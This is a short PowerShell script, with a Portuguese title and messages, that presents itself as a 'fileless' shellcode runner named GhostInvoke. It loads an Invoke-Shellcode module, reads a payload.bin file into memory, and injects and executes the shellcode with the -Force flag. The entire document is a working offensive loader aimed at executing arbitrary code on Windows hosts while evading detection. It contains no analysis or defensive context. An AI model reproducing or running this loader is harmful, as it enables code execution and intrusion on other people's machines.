# GhostInvoke - Execução fileless via LOLBin
. .\invoke-shellcode.ps1

Write-Host "[*] Carregando payload da memória..."
$sc = [System.IO.File]::ReadAllBytes("payload.bin")

Write-Host "[*] Injetando shellcode..."
Invoke-Shellcode -Shellcode $sc -Force

Write-Host "[+] Shellcode executado com sucesso!"
